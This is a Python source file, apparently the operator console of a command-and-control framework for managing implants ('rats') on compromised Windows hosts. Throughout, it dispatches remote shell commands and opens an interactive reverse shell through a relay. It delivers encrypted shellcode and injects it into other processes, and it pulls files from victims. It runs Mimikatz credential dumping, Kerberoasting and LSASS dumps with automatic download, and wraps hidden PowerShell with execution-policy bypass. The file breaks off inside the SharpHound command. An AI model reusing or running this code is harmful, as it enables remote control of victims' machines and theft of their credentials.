"""RatsMixin — rat management, shell, task, and module commands."""

import base64
import shlex
import time
from pathlib import Path

from .ui import (
    ok, err, info, warn,
    bold, cyan, grey, green,
    RESET, BOLD, GREEN,
    pad, table, print_output,
    fmt_ts, time_ago, rat_status, task_status,
)
from .api import rat_url, check, load_config, CONFIG_PATH


class RatsMixin:

    # ── Private helpers ───────────────────────────────────────────────────────

    def _find_shell_module(self, s, url):
        """Return the first os_shell module id, or None."""
        resp = check(s.get(f"{url}/api/search/modules",
                           params={"task_type": "os_shell", "title": "Shell Command"}))
        if not resp: return None
        mods = resp.json()
        if not mods:
            resp = check(s.get(f"{url}/api/search/modules",
                               params={"task_type": "os_shell"}))
            if not resp: return None
            mods = resp.json()
        if not mods:
            err("No os_shell module found. Try: reload")
            return None
        return mods[0]["id"]

    def _find_module_by_type(self, s, url, task_type, title=None):
        """Look up a module ID from the API by task_type and optional title."""
        params = {"task_type": task_type}
        if title:
            params["title"] = title
        resp = check(s.get(f"{url}/api/search/modules", params=params))
        if not resp: return None
        mods = resp.json()
        if not mods:
            err(f"No '{task_type}' module found — run 'reload' if recently added")
            return None
        return mods[0]["id"]

    def _resolve_module(self, ref):
        """Return a module dict from cache by # index or module ID."""
        ref = ref.strip()
        if ref.isdigit():
            idx = int(ref)
            if not self.module_cache:
                err("Module cache empty — run 'modules' first")
                return None
            if idx >= len(self.module_cache):
                err(f"Index {idx} out of range — run 'modules' to refresh")
                return None
            return self.module_cache[idx]
        m = next((m for m in self.module_cache if m["id"] == ref), None)
        if not m:
            err(f"Module '{ref}' not found — run 'modules' to refresh")
        return m

    def _dispatch_task(self, s, url, module_id, parameters, wait=True, timeout=60, rat_id=None):
        """Dispatch any module task to a rat (defaults to active rat).
        Returns (task_id, output) — output is None if not waiting or timed out."""
        target = rat_id or self.active_rat
        body   = {"module_id": module_id, "parameters": parameters}
        resp   = check(s.post(rat_url(url, target, "add_task"),
                              json=body,
                              headers={"Content-Type": "application/json"}))
        if not resp: return None, None
        task_id = resp.json().get("id", "?")
        if not wait:
            return task_id, None
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(2)
            r2 = check(s.get(rat_url(url, target, "tasks")))
            if not r2: return task_id, None
            t = next((x for x in r2.json() if x["id"] == task_id), None)
            if t and t.get("completed_at", 0):
                return task_id, t.get("output", "")
        return task_id, None

    def _dispatch_and_wait(self, s, url, module_id, command, timeout=60):
        """Dispatch a shell command and block until output arrives."""
        _, output = self._dispatch_task(s, url, module_id, {"command": command}, timeout=timeout)
        return output

    def _shell_prompt(self):
        """Decode rat_id to produce a realistic shell prompt."""
        try:
            decoded = base64.b64decode(self.active_rat).decode(errors="replace")
            parts   = decoded.split(":")
            # format: rand5:imp_id:username:hostname:domain
            user = parts[2] if len(parts) > 2 else "user"
            host = parts[3] if len(parts) > 3 else "host"
            return f"{green(user)}@{cyan(host)} {BOLD}${RESET} "
        except Exception:
            return f"{cyan('shell')} {BOLD}${RESET} "

    # ── rats ──────────────────────────────────────────────────────────────────

    def do_rats(self, arg):
        """rats  —  List all rats"""
        from email.utils import parsedate_to_datetime
        s, url = self._session()
        if not s: return
        resp = check(s.get(f"{url}/api/rats"))
        if not resp: return
        # Use server clock from response Date header to avoid skew in multi-operator sessions
        try:
            ref_ms = parsedate_to_datetime(resp.headers['Date']).timestamp() * 1000
        except Exception:
            ref_ms = None
        rats = resp.json()
        self.rat_cache = [r["id"] for r in rats]
        if not rats:
            info("No rats registered yet.")
            return
        rows = []
        for i, r in enumerate(rats):
            rid      = r["id"]
            short_id = cyan(rid[:24]) + grey("…") if len(rid) > 24 else cyan(rid)
            rows.append([
                grey(str(i)),
                short_id,
                r.get("user",   grey("?")),
                r.get("host",   grey("?")),
                r.get("domain", grey("?")),
                time_ago(r.get("last_seen"), ref_ms),
                rat_status(r.get("last_seen"), ref_ms),
            ])
        table(rows, ["#", "RAT ID", "User", "Host", "Domain", "Last Seen", "Status"],
              title=f"Rats  {grey(f'({len(rats)} total)')}",
              max_col=28)

    # ── use ───────────────────────────────────────────────────────────────────

    def do_use(self, arg):
        """use <#|rat_id>  —  Set active rat context (use index from 'rats' or full id)"""
        rat_id = arg.strip()
        if not rat_id:
            err("Usage: use <#|rat_id>")
            return
        if rat_id.isdigit():
            idx = int(rat_id)
            if idx >= len(self.rat_cache):
                err(f"Index {idx} out of range — run 'rats' to refresh")
                return
            rat_id = self.rat_cache[idx]
        self.active_rat = rat_id
        self._rat_mode = None  # reset — auto-detect or use 'mode' command
        self._update_prompt()
        ok(f"Active rat set  →  {cyan(rat_id)}")
        info(f"Rat mode: {self._get_rat_mode()} — change with: mode ps|cmd")

    def complete_use(self, text, line, begidx, endidx):
        return [r for r in self.rat_cache if r.startswith(text)]

    # ── mode ─────────────────────────────────────────────────────────────────

    def _get_rat_mode(self):
        """Return 'ps' or 'cmd' for the active rat."""
        return getattr(self, '_rat_mode', None) or 'cmd'

    def _need_ps_rat(self):
        """Gate PS-only commands. Returns True if ok, False with error if not."""
        if not self._need_rat():
            return False
        if self._get_rat_mode() != 'ps':
            err("This command requires a powershell_clr rat (mode: ps)")
            info("If this rat uses powershell_clr, run: mode ps")
            return False
        return True

    def do_mode(self, arg):
        """mode <ps|cmd>  —  Set execution mode for active rat (powershell_clr or os_shell)"""
        if not self._need_rat(): return
        m = arg.strip().lower()
        if m in ('ps', 'powershell', 'powershell_clr', 'clr'):
            self._rat_mode = 'ps'
            ok("Rat mode set to ps (powershell_clr)")
            info("PS modules enabled: mimikatz, kerberoast, sharphound, portscan, etc.")
        elif m in ('cmd', 'os_shell', 'shell'):
            self._rat_mode = 'cmd'
            ok("Rat mode set to cmd (os_shell)")
        else:
            err("Usage: mode <ps|cmd>")
            info("  ps   — powershell_clr rat (enables PS modules, raw script execution)")
            info("  cmd  — os_shell rat (cmd.exe execution only)")

    def complete_mode(self, text, line, begidx, endidx):
        return [m for m in ['ps', 'cmd'] if m.startswith(text)]

    # ── kill ──────────────────────────────────────────────────────────────────

    def do_kill(self, arg):
        """kill [# | rat_id | all]  —  Send die to implant then delete rat record"""
        s, url = self._session()
        if not s: return

        if arg.strip().lower() == "all":
            resp = check(s.get(f"{url}/api/rats"))
            if not resp: return
            rats = resp.json()
            if not rats:
                info("No rats to kill.")
                return
            module_id = self._find_module_by_type(s, url, "implant_control", title="Die")
            if not module_id:
                warn("Die module not found — deleting rat records only")
            for r in rats:
                rid = r["id"]
                if module_id:
                    self._dispatch_task(s, url, module_id, {}, wait=False, rat_id=rid)
                check(s.delete(rat_url(url, rid)))
            self.active_rat = None
            self._update_prompt()
            self.rat_cache = []
            ok(f"Killed {len(rats)} rat{'s' if len(rats) != 1 else ''}")
            return

        rat_id = arg.strip()
        if rat_id.isdigit():
            idx = int(rat_id)
            if not self.rat_cache:
                err("Rat cache empty — run 'rats' first")
                return
            if idx >= len(self.rat_cache):
                err(f"Index {idx} out of range — run 'rats' to refresh")
                return
            rat_id = self.rat_cache[idx]
        elif not rat_id:
            if not self._need_rat(): return
            rat_id = self.active_rat

        module_id = self._find_module_by_type(s, url, "implant_control", title="Die")
        if module_id:
            task_id, _ = self._dispatch_task(s, url, module_id, {}, wait=False, rat_id=rat_id)
            if task_id:
                info(f"Die queued  ({grey(task_id)})  — waiting for implant to pick it up …")
                deadline = time.time() + 60
                while time.time() < deadline:
                    time.sleep(2)
                    r2 = check(s.get(rat_url(url, rat_id, "tasks")))
                    if not r2: break
                    t = next((x for x in r2.json() if x["id"] == task_id), None)
                    if t and t.get("retrieved_at", 0):
                        info("Die task retrieved by implant")
                        break
                else:
                    warn("Timed out waiting for implant — deleting rat record anyway")
        else:
            warn("Die module not found — deleting rat record only")

        resp = check(s.delete(rat_url(url, rat_id)))
        if not resp: return
        ok(f"Killed  {cyan(rat_id[:24])}")
        if self.active_rat == rat_id:
            self.active_rat = None
            self._update_prompt()
        if rat_id in self.rat_cache:
            self.rat_cache.remove(rat_id)

    # ── back ──────────────────────────────────────────────────────────────────

    def do_back(self, arg):
        """back  —  Clear active rat context"""
        if self.active_rat:
            ok(f"Cleared  {cyan(self.active_rat)}")
        self.active_rat = None
        self._update_prompt()

    # ── info ──────────────────────────────────────────────────────────────────

    def do_info(self, arg):
        """info  —  Show active rat details"""
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return

        resp = check(s.get(rat_url(url, self.active_rat, "info")))
        if not resp: return
        r = resp.json()

        print(f"\n  {bold('RAT')}  {cyan(self.active_rat)}")
        print(f"  {'─' * 55}")
        for k, v in [
            ("User",       r.get("user",      grey("?"))),
            ("Host",       r.get("host",      grey("?"))),
            ("Domain",     r.get("domain",    grey("?"))),
            ("Task type",  r.get("task_type", grey("?"))),
            ("First seen", fmt_ts(r.get("first_seen"))),
            ("Last seen",  fmt_ts(r.get("last_seen"))),
            ("Status",     rat_status(r.get("last_seen"))),
        ]:
            print(f"  {grey(k+':'):<24} {v}")
        print()

    # ── shell (TCP reverse shell via station relay) ───────────────────────────

    def do_shell(self, arg):
        """shell [relay_host:port]  —  Reverse shell via station TCP relay"""
        import json, os, select, socket, sys, termios, tty

        if not self._need_rat(): return
        s, url = self._session()
        if not s: return

        # Resolve relay address: arg > saved config > prompt
        relay_addr = arg.strip() or None
        if not relay_addr:
            cfg = load_config() or {}
            relay_addr = cfg.get('relay')
        if not relay_addr:
            try:
                relay_addr = input(f"\n  {grey('station relay  host:port')} » ").strip()
                print()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not relay_addr:
                return

        # Persist relay address for next time
        cfg = load_config() or {}
        if cfg.get('relay') != relay_addr:
            cfg['relay'] = relay_addr
            CONFIG_PATH.write_text(json.dumps(cfg, indent=2))

        try:
            relay_host, relay_port_s = relay_addr.rsplit(':', 1)
            relay_port = int(relay_port_s)
        except ValueError:
            err(f"Invalid relay address '{relay_addr}'  —  expected host:port")
            return

        # Find revshell module
        module_id = self._find_module_by_type(s, url, 'revshell')
        if not module_id: return

        # Generate 4-byte session token (8 hex chars) to pair operator + implant
        token_bytes = os.urandom(4)
        token_hex   = token_bytes.hex()

        # Connect to relay FIRST — thorn holds the "operator" slot
        info(f"Connecting to relay  {cyan(relay_addr)}  …")
        try:
            relay_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            relay_sock.settimeout(10)
            relay_sock.connect((relay_host, relay_port))
            relay_sock.sendall(token_bytes)
            relay_sock.settimeout(None)
        except Exception as e:
            err(f"Relay connect failed: {e}")
            return

        # Dispatch REVSHELL task — implant will connect as the "implant" slot
        task_id, _ = self._dispatch_task(s, url, module_id, {
            'host':  relay_host,
            'port':  str(relay_port),
            'token': token_hex,
        }, wait=False)
        if not task_id:
            relay_sock.close()
            return

        ok(f"Shell task dispatched  {grey(task_id)}")
        info(f"Waiting for implant to connect …  {grey('Ctrl+C to abort')}\n")

        # ── Phase 1: wait for implant in cooked mode (Ctrl+C still works) ────────
        initial = b''
        try:
            while not initial:
                r, _, _ = select.select([relay_sock], [], [], 1.0)
                if relay_sock in r:
                    initial = relay_sock.recv(4096)
                    if not initial:
                        err("Relay closed before implant connected")
                        relay_sock.close()
                        return
        except KeyboardInterrupt:
            print()
            relay_sock.close()
            return

        # ── Phase 2: implant connected — switch to raw interactive mode ────────
        old_settings = termios.tcgetattr(sys.stdin.fileno())
        try:
            tty.setraw(sys.stdin.fileno())
            sys.stdout.buffer.write(initial)
            sys.stdout.buffer.flush()
            relay_sock.setblocking(False)
            while True:
                try:
                    r, _, _ = select.select([relay_sock, sys.stdin], [], [], 1.0)
                except (ValueError, KeyboardInterrupt):
                    break
                if relay_sock in r:
                    try:
                        data = relay_sock.recv(4096)
                        if not data:
                            break
                        sys.stdout.buffer.write(data)
                        sys.stdout.buffer.flush()
                    except (BlockingIOError, OSError):
                        break
                if sys.stdin in r:
                    try:
                        ch = sys.stdin.buffer.read(1)
                        if ch:
                            # Local echo — cmd.exe has no console so won't echo back
                            if ch in (b'\r', b'\n'):
                                sys.stdout.buffer.write(b'\r\n')
                                sys.stdout.buffer.flush()
                                relay_sock.sendall(b'\r\n')
                            else:
                                if ch in (b'\x7f', b'\x08'):
                                    sys.stdout.buffer.write(b'\x08 \x08')
                                elif ch[0] >= 0x20:
                                    sys.stdout.buffer.write(ch)
                                sys.stdout.buffer.flush()
                                relay_sock.sendall(ch)
                    except OSError:
                        break
        except Exception:
            pass
        finally:
            try:
                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)
            except Exception:
                pass
            relay_sock.close()

        print(f"\r\n  {grey('shell closed')}\r\n")

    # ── command ────────────────────────────────────────────────────────────────

    def do_command(self, arg):
        """command "<cmd>" [-w] [-t <secs>]  —  Run a single shell command on active rat"""
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return

        wait      = False
        timeout   = 60
        parts     = arg.split()
        cmd_parts = []
        i = 0
        while i < len(parts):
            if parts[i] in ("-w", "--wait"):
                wait = True
            elif parts[i] in ("-t", "--timeout") and i + 1 < len(parts):
                try:
                    timeout = int(parts[i + 1])
                    i += 1
                except ValueError:
                    pass
            else:
                cmd_parts.append(parts[i])
            i += 1

        command = " ".join(cmd_parts)
        if not command:
            err("Usage: command \"<command>\"  [-w to wait for output]")
            return

        module_id = self._find_shell_module(s, url)
        if not module_id: return

        body = {"module_id": module_id, "parameters": {"command": command}}
        resp = check(s.post(rat_url(url, self.active_rat, "add_task"),
                            json=body,
                            headers={"Content-Type": "application/json"}))
        if not resp: return
        task_id = resp.json().get("id", "?")
        ok(f"Task scheduled  {cyan(task_id)}")
        info(f"Command: {command}")

        if not wait:
            info(f"Run  {grey(f'output {task_id}')}  when complete")
            return

        info("Waiting for output…")
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(3)
            r2 = check(s.get(rat_url(url, self.active_rat, "tasks")))
            if not r2: return
            t = next((x for x in r2.json() if x["id"] == task_id), None)
            if t and t.get("completed_at", 0):
                ok(f"Completed in {int(time.time() - start)}s")
                print_output(t.get("output", ""))
                return

        warn(f"Timed out after {timeout}s — run:  output {task_id}")

    # ── tasks ─────────────────────────────────────────────────────────────────

    def do_tasks(self, arg):
        """tasks  —  Task history for active rat"""
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return
        resp = check(s.get(rat_url(url, self.active_rat, "tasks")))
        if not resp: return
        tasks = sorted(resp.json(),
                       key=lambda t: t.get("scheduled_at", 0), reverse=True)
        if not tasks:
            info("No tasks yet.")
            return
        rows = []
        for t in tasks:
            display = t.get("display") or t.get("module_id") or grey("?")
            preview = ""
            if t.get("output"):
                raw     = str(t["output"]).strip().replace("\n", " ")
                preview = raw[:50] + ("…" if len(raw) > 50 else "")
            rows.append([cyan(t["id"]), display, fmt_ts(t.get("scheduled_at")),
                         task_status(t), preview])
        table(rows, ["Task ID", "Description", "Scheduled", "Status", "Output Preview"],
              title=f"Tasks  {grey(f'({len(tasks)} total)')}")

    # ── output ────────────────────────────────────────────────────────────────

    def do_output(self, arg):
        """output <task_id>  —  Show full output of a task"""
        task_id = arg.strip()
        if not task_id:
            err("Usage: output <task_id>")
            return
        s, url = self._session()
        if not s: return

        if self.active_rat:
            resp = check(s.get(rat_url(url, self.active_rat, "tasks")))
            if not resp: return
            tasks = resp.json()
        else:
            resp = check(s.get(f"{url}/api/rats"))
            if not resp: return
            tasks = []
            for r in resp.json():
                r2 = check(s.get(rat_url(url, r["id"], "tasks")))
                if r2:
                    tasks.extend(r2.json())

        t = next((x for x in tasks if x["id"] == task_id), None)
        if not t:
            err(f"Task '{task_id}' not found")
            return

        display = t.get("display") or t.get("module_id") or "?"
        print(f"\n  {bold('Task')}  {cyan(t['id'])}")
        print(f"  {'─' * 55}")
        for k, v in [
            ("Description", display),
            ("Status",      task_status(t)),
            ("Scheduled",   fmt_ts(t.get("scheduled_at"))),
            ("Retrieved",   fmt_ts(t.get("retrieved_at"))),
            ("Completed",   fmt_ts(t.get("completed_at"))),
        ]:
            print(f"  {grey(k+':'):<24} {v}")
        print_output(t.get("output"))

    # ── modules ───────────────────────────────────────────────────────────────

    def do_modules(self, arg):
        """modules [search]  —  List available modules"""
        s, url = self._session()
        if not s: return
        params = {}
        parts  = arg.strip().split(None, 1)
        if parts:
            params["title"] = parts[0]
        resp = check(s.get(f"{url}/api/search/modules", params=params))
        if not resp: return
        mods = resp.json()
        if not mods:
            info("No modules found.")
            return
        self.module_cache = mods
        rows = [[grey(str(i)), cyan(m["id"]), m.get("task_type", grey("?")),
                 m.get("title", grey("?")), (m.get("description") or "")[:50]]
                for i, m in enumerate(mods)]
        table(rows, ["#", "ID", "Type", "Title", "Description"],
              title=f"Modules  {grey(f'({len(mods)} loaded)')}")

    # ── run ───────────────────────────────────────────────────────────────────

    def do_run(self, arg):
        """run <#|module_id> [key=value ...]  —  Dispatch any module to active rat"""
        if not self._need_rat(): return
        try:
            parts = shlex.split(arg)
        except ValueError as e:
            err(f"Parse error: {e}")
            return
        if not parts:
            err("Usage: run <#|module_id> [key=value ...]")
            return
        m = self._resolve_module(parts[0])
        if not m: return
        s, url = self._session()
        if not s: return
        params = {}
        for p in parts[1:]:
            if '=' in p:
                k, v = p.split('=', 1)
                params[k.strip()] = v.strip()
            else:
                err(f"Invalid parameter '{p}' — expected key=value")
                return
        info(f"Dispatching  {cyan(m.get('title', m['id']))}  …")
        task_id, output = self._dispatch_task(s, url, m["id"], params)
        if task_id is None: return
        if output is not None:
            ok("Completed")
            print_output(output)
        else:
            warn(f"No response — run:  output {task_id}")

    # ── sleep ─────────────────────────────────────────────────────────────────

    def do_sleep(self, arg):
        """sleep <ms>  —  Update beacon sleep interval on active rat"""
        if not self._need_rat(): return
        interval = arg.strip()
        if not interval or not interval.isdigit():
            err("Usage: sleep <milliseconds>  (e.g. sleep 30000)")
            return
        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "implant_control", title="Sleep Config")
        if not module_id: return
        info(f"Setting sleep interval to {cyan(interval)}ms …")
        task_id, output = self._dispatch_task(s, url, module_id, {"interval": interval})
        if task_id is None: return
        if output is not None:
            ok(output)
        else:
            info(f"Task queued  ({grey(task_id)})  — rat will apply on next beacon")
            info(f"Check result:  output {task_id}")

    # ── die ───────────────────────────────────────────────────────────────────

    def do_die(self, arg):
        """die  —  Instruct active rat to exit cleanly"""
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "implant_control", title="Die")
        if not module_id: return
        warn(f"Sending die to  {cyan(self.active_rat[:20])}  — implant will not respond")
        task_id, _ = self._dispatch_task(s, url, module_id, {}, wait=False)
        if task_id:
            ok(f"Die task queued  ({grey(task_id)})")

    # ── sysinfo ───────────────────────────────────────────────────────────────

    def do_sysinfo(self, arg):
        """sysinfo  —  Dump process/user/OS info from active rat (PEB/env/NT native)"""
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return
        module_id = self._find_shell_module(s, url)
        if not module_id: return
        info("Querying sysinfo …")
        output = self._dispatch_and_wait(s, url, module_id, "!info", timeout=30)
        if output is not None:
            print_output(output)
        else:
            warn("Timed out waiting for sysinfo response")

    # ── upload ────────────────────────────────────────────────────────────────

    def do_download(self, arg):
        """download <remote_path> <local_path>  —  Pull a file from the rat to the C2"""
        if not self._need_rat(): return
        try:
            parts = shlex.split(arg)
        except ValueError as e:
            err(f"Parse error: {e}")
            return
        if len(parts) != 2:
            err('Usage: download <remote_path> <local_path>')
            err('       download "C:\\Users\\Public\\loot.txt" /tmp/loot.txt')
            return
        remote_path, local_path = parts
        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "download", title="Download")
        if not module_id: return
        info(f"Downloading  {cyan(remote_path)}  →  {cyan(local_path)}  …")
        task_id, output = self._dispatch_task(
            s, url, module_id,
            {"remote_path": remote_path, "local_path": local_path},
            timeout=120)
        if task_id is None: return
        if output is not None:
            ok(output)
        else:
            warn(f"No response — run:  output {task_id}")

    # ── shellcode (inline encrypted delivery) ─────────────────────────────────

    def do_shellcode(self, arg):
        """shellcode <local_path>  —  AES-encrypt and deliver shellcode inline to rat"""
        if not self._need_rat(): return
        local_path = arg.strip()
        if not local_path:
            err("Usage: shellcode <local_path>")
            return
        path = Path(local_path).expanduser()
        if not path.exists():
            err(f"File not found: {path}")
            return

        # Encrypt using build config key/IV
        import sys as _sys
        _builder_dir = Path(__file__).parent.parent / "builder"
        if str(_builder_dir) not in _sys.path:
            _sys.path.insert(0, str(_builder_dir))
        try:
            from bab.config import load_config as load_build_cfg
            from bab.build  import patch_donut_bytes
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad as pkcs7_pad
        except ImportError as e:
            err(f"Missing dependency: {e}  —  run: pip install pycryptodome")
            return

        build_cfg = load_build_cfg()
        key = build_cfg["key"].encode().ljust(32, b'\x00')[:32]
        iv  = build_cfg["iv"].encode().ljust(16, b'\x00')[:16]
        raw = patch_donut_bytes(path.read_bytes())
        enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pkcs7_pad(raw, AES.block_size))
        payload = base64.b64encode(enc).decode()

        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "shellcode_load_inline")
        if not module_id: return

        info(f"Shellcode: {len(raw):,} bytes  →  {len(enc):,} bytes AES-256-CBC encrypted")
        task_id, _ = self._dispatch_task(s, url, module_id, {"payload": payload}, wait=False)
        if task_id is None: return
        ok(f"Shellcode dispatched  {grey(task_id)}")
        info(f"Check result:  output {task_id}")

    def complete_shellcode(self, text, line, begidx, endidx):
        return self._path_complete(text, line, begidx)

    # ── inject (remote process injection) ─────────────────────────────────────

    def do_inject(self, arg):
        """inject <pid> <shellcode_path> [method]  —  Inject shellcode into a remote process

        Methods:  section_map (default), module_stomp, classic
        """
        if not self._need_rat(): return
        parts = arg.strip().split()
        if len(parts) < 2:
            err("Usage: inject <pid> <shellcode_path> [section_map|module_stomp|classic]")
            return

        pid_str = parts[0]
        local_path = parts[1]
        method = parts[2] if len(parts) > 2 else "section_map"

        if method not in ("section_map", "module_stomp", "classic"):
            err(f"Unknown method '{method}' — use: section_map, module_stomp, classic")
            return

        try:
            pid = int(pid_str)
        except ValueError:
            err(f"Invalid PID: {pid_str}")
            return

        path = Path(local_path).expanduser()
        if not path.exists():
            err(f"File not found: {path}")
            return

        import sys as _sys
        _builder_dir = Path(__file__).parent.parent / "builder"
        if str(_builder_dir) not in _sys.path:
            _sys.path.insert(0, str(_builder_dir))
        try:
            from bab.config import load_config as load_build_cfg
            from bab.build  import patch_donut_bytes
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad as pkcs7_pad
        except ImportError as e:
            err(f"Missing dependency: {e}  —  run: pip install pycryptodome")
            return

        build_cfg = load_build_cfg()
        key = build_cfg["key"].encode().ljust(32, b'\x00')[:32]
        iv  = build_cfg["iv"].encode().ljust(16, b'\x00')[:16]
        raw = patch_donut_bytes(path.read_bytes())
        enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pkcs7_pad(raw, AES.block_size))
        payload = base64.b64encode(enc).decode()

        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "process_inject")
        if not module_id: return

        info(f"Inject: {method} → PID {pid}  ({len(raw):,} bytes → {len(enc):,} bytes encrypted)")
        task_id, output = self._dispatch_task(
            s, url, module_id,
            {"method": method, "pid": str(pid), "payload": payload},
            wait=True, timeout=30,
        )
        if task_id is None: return
        if output:
            ok(f"Inject complete  {grey(task_id)}")
            print(output)
        else:
            ok(f"Inject dispatched  {grey(task_id)}")
            info(f"Check result:  output {task_id}")

    def complete_inject(self, text, line, begidx, endidx):
        parts = line.split()
        if len(parts) <= 2 or (len(parts) == 2 and not line.endswith(' ')):
            return []
        if (len(parts) == 3 and not line.endswith(' ')) or (len(parts) == 2 and line.endswith(' ')):
            return self._path_complete(text, line, begidx)
        methods = ['section_map', 'module_stomp', 'classic']
        return [m for m in methods if m.startswith(text)]

    # ── bof (inline BOF execution) ────────────────────────────────────────────

    def do_bof(self, arg):
        """bof <local_path.o>  —  Pack, encrypt, and execute a BOF inline on the rat"""
        if not self._need_rat(): return
        local_path = arg.strip()
        if not local_path:
            err("Usage: bof <local_path.o>")
            info("Compiles a COFF .o (BOF) into an encrypted bundle and dispatches it inline.")
            return
        path = Path(local_path).expanduser()
        if not path.exists():
            err(f"File not found: {path}")
            return

        import sys as _sys
        _builder_dir = Path(__file__).parent.parent / "builder"
        if str(_builder_dir) not in _sys.path:
            _sys.path.insert(0, str(_builder_dir))
        try:
            from bab.config import load_config as load_build_cfg
            from bab.bof    import pack_and_encrypt
        except ImportError as e:
            err(f"Missing dependency: {e}")
            return

        build_cfg = load_build_cfg()
        ciphertext = pack_and_encrypt(path, None, build_cfg)
        if ciphertext is None:
            return
        payload = base64.b64encode(ciphertext).decode()

        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "bof_inline")
        if not module_id:
            err("bof_inline module not found — check modules are loaded")
            return

        info(f"BOF: {path.name}  →  {len(ciphertext):,} bytes AES-256-CBC encrypted")
        task_id, output = self._dispatch_task(s, url, module_id, {"payload": payload}, wait=True)
        if task_id is None: return
        ok(f"BOF complete  {grey(task_id)}")
        if output:
            print(output)

    def complete_bof(self, text, line, begidx, endidx):
        return self._path_complete(text, line, begidx)

    # ── PowerShell post-ex helpers ─────────────────────────────────────────────

    def _ps_tools_dir(self):
        """Return Path to bundled PS1 tools directory."""
        return Path(__file__).parent.parent / "code_snippets" / "tools" / "original" / "pwsh"

    def _encode_ps(self, ps1_path, invocation):
        """Build a PS command from a PS1 file + invocation.

        In ps mode (powershell_clr): returns raw script for direct CLR execution.
        In cmd mode (os_shell): returns powershell -EncodedCommand wrapper.
        """
        content = Path(ps1_path).read_text(encoding="utf-8", errors="replace")
        script  = content + "\n" + invocation
        if self._get_rat_mode() == 'ps':
            return script
        enc_cmd = base64.b64encode(script.encode("utf-16-le")).decode()
        return f"powershell -w hidden -ep bypass -EncodedCommand {enc_cmd}"

    def _dispatch_ps(self, s, url, task_type, command, timeout=120):
        """Dispatch a PS task and wait for output. Returns output string or None."""
        module_id = self._find_module_by_type(s, url, task_type)
        if not module_id: return None
        task_id, output = self._dispatch_task(s, url, module_id, {"command": command}, timeout=timeout)
        if task_id is None: return None
        return output

    # ── mimikatz ──────────────────────────────────────────────────────────────

    def do_mimikatz(self, arg):
        """mimikatz  —  Run Invoke-Mimikatz -DumpCreds in-memory on active rat (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "Invoke-Mimikatz.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return
        command = self._encode_ps(ps1, "Invoke-Mimikatz -DumpCreds")
        s, url = self._session()
        if not s: return
        info("Dispatching Invoke-Mimikatz -DumpCreds …")
        output = self._dispatch_ps(s, url, "ps_mimikatz", command, timeout=120)
        if output is not None:
            ok("Mimikatz complete")
            print_output(output)
        else:
            warn("Timed out — task still running, check: tasks")

    # ── kerberoast ────────────────────────────────────────────────────────────

    def do_kerberoast(self, arg):
        """kerberoast [-d <domain>] [-u <user>]  —  Run Invoke-Kerberoast in-memory (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "Invoke-Kerberoast.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return

        try:
            parts = shlex.split(arg)
        except ValueError as e:
            err(f"Parse error: {e}")
            return

        domain = user = None
        i = 0
        while i < len(parts):
            if parts[i] in ("-d", "--domain") and i + 1 < len(parts):
                domain = parts[i + 1]; i += 2
            elif parts[i] in ("-u", "--user") and i + 1 < len(parts):
                user = parts[i + 1]; i += 2
            else:
                i += 1

        invoke = "Invoke-Kerberoast -OutputFormat Hashcat"
        if domain: invoke += f" -Domain {domain}"
        if user:   invoke += f" -Identity {user}"
        invoke += " | fl"

        command = self._encode_ps(ps1, invoke)
        s, url = self._session()
        if not s: return
        info(f"Dispatching Invoke-Kerberoast …")
        output = self._dispatch_ps(s, url, "ps_kerberoast", command, timeout=120)
        if output is not None:
            ok("Kerberoast complete")
            print_output(output)
        else:
            warn("Timed out — task still running, check: tasks")

    # ── lsass_dump ────────────────────────────────────────────────────────────

    def do_lsass_dump(self, arg):
        """lsass_dump [<local_save_path>]  —  Dump LSASS to minidump and auto-download (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "Out-MiniDump.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return

        local_path = arg.strip() or "lsass.dmp"
        remote_tmp = r"C:\Windows\Temp\lsass.dmp"

        invoke  = f'Out-Minidump -Process (Get-Process lsass) -Path "{remote_tmp}"'
        command = self._encode_ps(ps1, invoke)

        s, url = self._session()
        if not s: return
        info(f"Dumping LSASS → {remote_tmp} …")
        output = self._dispatch_ps(s, url, "ps_lsass_dump", command, timeout=180)
        if output is None:
            warn("Timed out waiting for dump — check: tasks")
            return
        print_output(output)

        # Auto-download the dmp
        dl_module = self._find_module_by_type(s, url, "download", title="Download")
        if not dl_module:
            warn("Download module not found — retrieve manually: download \"C:\\Windows\\Temp\\lsass.dmp\" " + local_path)
            return
        info(f"Downloading {remote_tmp} → {local_path} …")
        _, dl_out = self._dispatch_task(s, url, dl_module,
                                         {"remote_path": remote_tmp, "local_path": local_path},
                                         timeout=120)
        if dl_out is not None:
            ok(f"Saved: {local_path}")
        else:
            warn(f"Download timed out — run:  download \"{remote_tmp}\" {local_path}")

    # ── sharphound ────────────────────────────────────────────────────────────

    def do_sharphound(self, arg):
        """sharphound [All|DCOnly|...]  —  Run SharpHound in-memory and auto-download zip (requires mode ps)"""
        if not self._need_ps_rat(): return
        ps1 = self._ps_tools_dir() / "Sharphound.ps1"
        if not ps1.exists():
            err(f"PS1 not found: {ps1}")
            return

